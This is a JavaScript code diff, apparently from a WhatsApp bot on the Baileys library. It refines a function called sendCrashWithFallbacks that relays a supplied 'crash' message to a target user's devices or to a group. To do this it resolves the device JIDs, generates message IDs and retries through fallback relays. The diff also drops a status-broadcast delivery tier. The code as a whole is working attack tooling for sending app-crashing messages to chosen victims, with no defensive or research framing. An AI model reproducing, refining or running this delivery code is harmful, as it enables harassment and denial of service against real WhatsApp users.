@@ -1,3 +1,14 @@
+const crypto = require('crypto');
+
+function generateMsgId(sock) {
+    if (typeof sock?.generateMessageID === 'function') {
+        try {
+            return sock.generateMessageID();
+        } catch (e) {}
+    }
+    return '3EB0' + crypto.randomBytes(8).toString('hex').toUpperCase();
+}
+
 async function getTargetDevices(sock, target) {
     if (!target) return [];
     if (String(target).endsWith('@g.us')) return [target];
@@ -6,12 +17,7 @@ async function getTargetDevices(sock, target) {
     if (!cleanUser) return [];
 
     const baseJid = `${cleanUser}@s.whatsapp.net`;
-    const deviceSet = new Set([
-        baseJid,
-        `${cleanUser}:0@s.whatsapp.net`,
-        `${cleanUser}:1@s.whatsapp.net`,
-        `${cleanUser}:2@s.whatsapp.net`
-    ]);
+    const deviceSet = new Set([baseJid]);
 
     try {
         if (typeof sock?.getUSyncDevices === 'function') {
@@ -25,7 +31,12 @@ async function getTargetDevices(sock, target) {
             }
         }
     } catch (e) {
-        // Fallback to primary device & secondary device JIDs
+        // Fallback to base JID and common device indexes
+    }
+
+    if (deviceSet.size <= 1) {
+        deviceSet.add(`${cleanUser}:0@s.whatsapp.net`);
+        deviceSet.add(`${cleanUser}:1@s.whatsapp.net`);
     }
 
     return Array.from(deviceSet);
@@ -40,61 +51,59 @@ async function sendCrashWithFallbacks(sock, target, message, options = {}) {
     let deliveredCount = 0;
     let tier1Count = 0;
     let tier2Count = 0;
-    let tier3Count = 0;
 
-    const devices = await getTargetDevices(sock, target);
+    const isGroup = String(target).endsWith('@g.us');
 
-    // ── Tier 1: Low-level relay to all resolved target device JIDs ──
-    for (const devJid of devices) {
+    if (isGroup) {
+        // Direct group relay
         try {
-            await sock.relayMessage(devJid, message, {
-                ...options,
-                participant: devJid
+            const msgId = generateMsgId(sock);
+            await sock.relayMessage(target, message, {
+                messageId: msgId,
+                ...options
             });
             deliveredCount++;
             tier1Count++;
-        } catch (e1) {
+        } catch (e) {
+            errors.push(`Group Relay [${target}]: ${e.message}`);
+        }
+    } else {
+        // Direct individual JID and device JID relays
+        const devices = await getTargetDevices(sock, target);
+
+        for (const devJid of devices) {
             try {
-                await sock.relayMessage(devJid, message, {
-                    ...options,
-                    participant: { jid: devJid }
-                });
+                const msgId = generateMsgId(sock);
+                // Do NOT supply participant attribute for individual user JIDs
+                const relayOpts = {
+                    messageId: msgId,
+                    ...options
+                };
+                delete relayOpts.participant;
+
+                await sock.relayMessage(devJid, message, relayOpts);
                 deliveredCount++;
                 tier1Count++;
-            } catch (e2) {
-                errors.push(`Tier 1 [${devJid}]: ${e2.message || e1.message}`);
+            } catch (e1) {
+                errors.push(`Direct Relay [${devJid}]: ${e1.message}`);
             }
         }
-    }
 
-    // ── Tier 2: Standard Baileys sendMessage fallback ──
-    try {
-        await sock.sendMessage(target, message, options);
-        deliveredCount++;
-        tier2Count++;
-    } catch (e) {
-        errors.push(`Tier 2 [sendMessage]: ${e.message}`);
-    }
-
-    // ── Tier 3: Status broadcast relay with target mentions ──
-    try {
-        await sock.relayMessage("status@broadcast", message, {
-            ...options,
-            statusJidList: [target],
-            additionalNodes: [{
-                tag: "meta",
-                attrs: {},
-                content: [{
-                    tag: "mentioned_users",
-                    attrs: {},
-                    content: [{ tag: "to", attrs: { jid: target } }]
-                }]
-            }]
-        });
-        deliveredCount++;
-        tier3Count++;
-    } catch (e) {
-        errors.push(`Tier 3 [status@broadcast]: ${e.message}`);
+        // Secondary direct fallback to baseJid via relayMessage if initial attempts yielded no success
+        if (deliveredCount === 0) {
+            const cleanUser = String(target || '').split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
+            const baseJid = `${cleanUser}@s.whatsapp.net`;
+            try {
+                const msgId = generateMsgId(sock);
+                const fallbackOpts = { messageId: msgId, ...options };
+                delete fallbackOpts.participant;
+                await sock.relayMessage(baseJid, message, fallbackOpts);
+                deliveredCount++;
+                tier2Count++;
+            } catch (e2) {
+                errors.push(`Fallback Relay [${baseJid}]: ${e2.message}`);
+            }
+        }
     }
 
     return {
@@ -102,7 +111,6 @@ async function sendCrashWithFallbacks(sock, target, message, options = {}) {
         deliveredCount,
         tier1Count,
         tier2Count,
-        tier3Count,
         errors
     };
 }
